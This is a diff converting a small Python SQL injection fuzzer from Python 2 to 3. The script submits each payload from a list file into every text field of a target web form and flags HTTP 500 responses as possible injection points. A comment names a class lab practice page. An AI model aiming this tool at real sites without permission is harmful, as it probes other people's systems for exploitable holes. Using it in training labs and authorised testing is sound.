@@ -1,17 +1,17 @@
 #/bin/python
 # http://attack.samsclass.info/sqlol/search.htm
-import mechanize 
+import mechanize
 import logging
 import time
 from optparse import OptionParser
-from urllib2 import HTTPError
-import Queue
+from urllib.error import HTTPError
+import queue
 import threading
 
 start = time.time()
 
 def sqli(target, sqli_list):
-  
+
   sqli_list = open(sqli_list)
   for sqli in sqli_list.readlines():
     sqli = sqli.rstrip()
@@ -26,15 +26,15 @@ def sqli(target, sqli_list):
     for field in br.form.controls:
       if field.type == "text":
         br.form[field.name] = str(sqli)
-    print br.form#"! injecting {0}, in the form {1}, on the page: {2}".format(str(sqli), str(br.form.name), str(target))
+    print("Injecting {0}, in the form {1}, on the page: {2}".format(str(sqli), str(br.form.name), str(target)))
     request = br.click(type="submit")
     response = br.open(request)
     if response.code == 200:
-      print "No dice... 200 OK response"
+      print("No dice... 200 OK response")
     if response.code == 500:
-      print "500 Internal Error, potential SQL with {0}".format(str(field))
+      print("500 Internal Error, potential SQL with {0}".format(str(field)))
 
-	  
+
 def main():
   # Setup the command line arguments.
   optp = OptionParser()
@@ -53,19 +53,19 @@ def main():
   # Option for target web form to brute
   optp.add_option("-t", "--target", dest="target",
                   help="The target page to attack")
-				  
+
   # Option for sqli list to use in attack
   optp.add_option("-s", "--sqli", dest="sqli",
                   help="The list of SQL Injection attacks to use")
-				  
+
   opts, args = optp.parse_args()
 
   if opts.target is None:
-    opts.target = raw_input("What is the target page to attack w/ sqli: ")
-	
+    opts.target = input("What is the target page to attack w/ sqli: ")
+
   if opts.sqli is None:
-    opts.sqli = raw_input("What is the SQL injection file to use in our attack: ")
-	
+    opts.sqli = input("What is the SQL injection file to use in our attack: ")
+
   # Setup logging.
   logging.basicConfig(level=opts.loglevel,
                       format='%(levelname)-8s %(message)s')
@@ -74,14 +74,14 @@ def main():
   # Main Event Loop:
   try:
     sqli(opts.target, opts.sqli)
-  
+
   except (KeyboardInterrupt, EOFError) as e:
-    print "Exiting..."
+    print("Exiting...")
     exit(0)
-	
-  print "Injection Complete!"
-  print "Elapsed Time: %s" % (time.time() - start)
-  
+
+  print("Injection Complete!")
+  print("Elapsed Time: %s" % (time.time() - start))
+
 if __name__ == '__main__':
   main()
-	  
+
